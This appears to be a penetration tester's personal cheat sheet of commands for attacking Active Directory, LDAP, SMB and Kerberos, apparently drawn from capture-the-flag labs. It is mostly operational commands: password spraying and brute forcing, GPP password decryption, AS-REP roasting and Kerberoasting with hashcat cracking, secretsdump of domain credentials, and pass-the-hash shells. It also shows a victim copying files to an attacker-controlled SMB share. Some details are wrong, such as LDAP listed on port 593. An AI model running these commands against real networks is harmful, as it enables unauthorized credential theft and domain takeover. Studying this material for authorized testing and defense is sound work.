This file is for enumerating Active Directory/LDAP and SMB.


Port 53 is all about DNS
Port 464 - Kerberos password changes
Port 593 - RPC over http
Port 593 - LDAP


[*] DNSRecon - scan subnet for reverse lookup
	dnsrecon -d <domain ip> -r <range of subnet>
		dnsrecon -d 10.10.10.100 -r 10.0.0.0/8

[*] nslookup - hostname search
	this will hopefully leak a hostname
	nslookup
	server <ip address>
	127.0.0.1
	127.0.0.2

[*] ping - check ttl
	127 will be windows
	64 will be Linux
	above 128 it will most likely be a network device like Cisco
	ping -c 4 <ip address>


[*] Use to enumerate smb:
        rpcclient -U '' <IP addr>
            enumdomusers
            querydispinfo
            queryuser <RID id, like 0x045>
        crackmapexec smb <ip addr> -u '' -p '' --shares
        crackmapexec smb <ip addr> -u '<username>' -p '<password>'
	crackmapexec smb <ip addr> -u '<username>' -p '<password>' --users
        crackmapexec winrm <ip addr> -u '<username>' -p '<password>'
	crackmapexec smb <ip addr> -u userlist.txt -p password_list.txt # password spray smbshares
		Remember when password spraying, you can go after other services. SMB is good but if there is another vulnerable machine on the network that connects to ldal/AD, you can steal creds from that box. If there is a proprietary box on the network, that has an LDAP service, and queries the AD controllers, you may get Admin creds there, bypassing password spraying and get domain admin.
        poetry run crackmapexec smb <ip addr>
	poetry run crackmapexec smb <ip addr> --shares
	poetry run crackmapexec smb <ip addr> -u '' -p '' --shares
	poetry run crackmapexec smb <ip addr> -u '' -p '' --pass-pol
	poetry run crackmapexec smb <ip addr> -u '' -p '' --users
	poetry run crackmapexec smb <ip addr> -u '' -p '' -M spider_plus
	poetry run crackmapexec smb <ip addr> -u '' -p '' --get-file \\share\file.txt file.txt
		# If file download fails, try another tool.
		smbclient -N //ip_addr/share
		get file.txt
		mget * # get all the files
	poetry run crackmapexec smb <ip_addr> -u /path/to/users.txt -p /path/to/password.txt #bruteforce creds for smb share
	poetry run crackmapexec winrm <ip_addr> -u user -p password # get a shell. Could fail. Always try new creds for enumerating shares and login
        smbclient -U '' -L <ip addr>
	smbclient -L <ip addr>
	smbclient \\\\10.10.10.10\sharename
	smbclient -U svc-admin%management2005 -L //spookysec.local
	smbclient //<ip address>/share
		recurse ON
		prompt OFF
		mget *

[*] Create random password list with known words:
        hashcat --force <password file> -r /usr/share/hashcat/rules/best64.rule --stdout > <file name>

[*] Attempt to figure out the password policy - avoid lockout on bruteforce
    crackmapexec smb <IP addr> --password-pol

[*] Use to enumerate LDAP/AD:
	ldapsearch -h <ip address>
        ldapsearch -x -h <ip addr> -s base namingcontexts # Exactly as you see it, just add the IP address
        ldapsearch -x -h <ip addr> -s sub -b '<DC=domain,DC=com>'
	ldapsearch -x -h <ip addr> -b "DC=htb,DC=local" '(objectClass=Person)' # Looks for the objectClass in previous search, match to anything useful
		sAMAccountName: windows account name - use this for login.
	ldapsearch -x -h <ip addr> -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName sAMAccountType # query for useful content within sAMAccountName
	ldapsearch -x -h <ip addr> -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName # Use the names for a password spray

[*] Windows Epoc time
	Use a time converter since Windows does this weird:
	pswdlastset : <ldapquery will have a long time stamp>
		ihttps://www.epochconverter.com/ldap

[*] Create wordlists
	Generic wordlists:
		Months, seasons, years, !.
	If you don't know your victim, a generic wordlist makes sense. Also recommend running crackmapexec to an smb share in the environment to figure out password policy. Adjust password list to meet those requirements
	crackmapexec smb <ip addr> --pass-pol -u '' -p ''
	hashcat --force --stdout generic_wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort | uniq > new_password_list.txt
	You can also use "rsmangler" tool, just grep the notes for this tool

[]



[*] Tool impacket is best installed in a virtual environment if not installed on OS already.
	virtualenv -p python3 impacket-github
	source impacket-github/bin/activate
	git clone https://github.com/SecureAuthCorp/impacket.git
	cd ~/git/impacket
	pip install -r requirements.txt
	python setup.py install

[*] Impacket as smb server
	impacket-smbserver -smb2support -user iamauser -password iamapassword share $(pwd) # current working directory as share
		On the victim machine:
			$pass = convertto-securestring 'iamapassword' -AsPlainText -Force
			$cred = New-Object System.Management.Automation.PSCredential('iamauser', $pass)
			New-PSDrive -Name localshare -PSProvider FileSystem -Credentail $cred -Root \\10.10.10.10\share

[*] SMB enumerate steps:
	smbmap -H IPADDR
	smbmap -H IPADDR -u anonymous
	smbmap -R <share> -H <host ip> # enumerate content in share
		Look for Groups.xml, we will find accounts
	smbmap -R <share> -H <host ip> -A Groups.xml -q
		Download Groups.xml
		Assuming we found groups.xml, go through and find hashed password, "cpassword"
			gpp-decrypt <hashed password>
	smbmap -d <domain> -u <user> -p <password> -H <host ip> # enumerate RW privs

[*] spin up an smb server on Kali - transfer files to/from Windows and Kali
        sudo impact-smbserver -smb2support <share-name> </path/to/share>
        sudo impact-smbserver -smb2support iamawesomeshare $(pwd)
        sudo impact-smbserver -username iamusername -password iampassword IamSomeShare $(pwd)
	sudo smbserver.py -user username -password password -smb2upport share $(pwd)

[*] Copy files from Windows to our Kali SMB server
	net use Z: \\ATTACKERIP\filename.txt /user:iamusername iampassword
	copy filename.txt Z: # File will now be in SMB share


[*] Query Kerberos for ASReproastable accounts, you just need a valid account name to test.
	./GetNPUsers.py spookysec.local/svc-admin
	./GetNPUsers.py -dc-ip <ip addr> -request 'htb.local' -format hashcat
		hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
		crackmapexec smb <ip addr> -u <username> -p <cracked password> --shares #remove --shares to see if we can p0wn
			Remember, this doesn't have to be smb, you can use these creds on any service or box on the network that allows you to login
	

[*] impacket tool - secretsdump.py
	Part of impacket tools in github, use with credentials to pull passwords
	./secretsdump.py hostname/user:password@hostname
	Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

	[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets


[*] Once a shell has spawned on victim, create a mountable share (must use PowerShell)
        $pass = "iampassword" | ConvertTo-SecureString -AsPlainText -Force
        $pass # We should see some type of System.Security.Securestring
        $cred = New-Object System.Management.Automation.PsCredential('iamsomeusername', $pass)
        $cred # We should get our object printed with password as System.Security.SecureString
        New-PSDrive -name iamusername -root \\10.10.10.10\IamSomeShare -Credential $cred -PSProvider "filesystem"
             Go back to your Kali machine, scp/rsync your priv esc scripts or exploits to the smb share directory.
             Go bck to your Windows reverse shell and start attacking.
        .\winPEAS.exe cmd fat > winPEASfast.txt
             This is now in your smb share, stored on your Kali machine


[*] impacket tool - GetADUsers.py
        GetADUsers.py -all -dc-ip 10.10.10.100 domain/user

[*] impacket tool -  GetUserSPNs.py
        Query target domain for SPNs - Service Principal Name - unique identifier used by kerberos authentication
        GetUserSPNs.py -request -dc-ip 10.10.10.10 domain/user
                Kerberoasting - this should give you the hash of users that are kerberoast-able
                Copy/paste entire entry into a file to crack with hashcat
                hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt
                Assuming Administrator was found, use psexec

[*] impacket tool - GetNPUsers.py
	Query target domain with "Do not require Kerberos preauth" set and export their TGT for cracking

[*] Useful smb commands for connecting
	smbclient -N //10.10.10.10/share
	smbclient -U anonymous //10.10.10.10/share
	smbclient \\\\spookysec.local\\backup -U svc-admin
		You will be prompted for password, unless you supply -N flag

[*] Kerbrute tool - bruteforce users, password, and spray passwords
	https://github.com/ropnop/kerbrute/releases
	chmod 755 kerbrute_linux_amd64
- Examples running the tool
	./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local userlist.txt


[*] Install evil-winrm
	sudo gem install evil-winrm

	- Connect to remote host with a hash instead of password
		evil-winrm -i 10.10.10.10 -u hostname.local\\Administrator -H <hash>

[*] psexec - Microsoft tool to run processes remotely. Tri if a share is writeable
	psexec.py domain/user@10.10.10.10


[*] Useful tricks
	Assuming you have username and password, pull up your windows vm and type in:
		runas /netonly /user:USERNAME cmd
		Type in password
		You now have a cmd promp on local machine running as this non-existent user on your box. You can query the victim machine, tools like bloodhound
		cd ..\dir\to\Downloads
		dir \\10.10.10.10\share # verify you have a ticket
		Test-NetConnection -ComputerName 10.10.10.10 -Port 389
		.\SharpHound.exe -c -d <domain> --DomainController <ip address>
		.\SharpHound.exe -c all
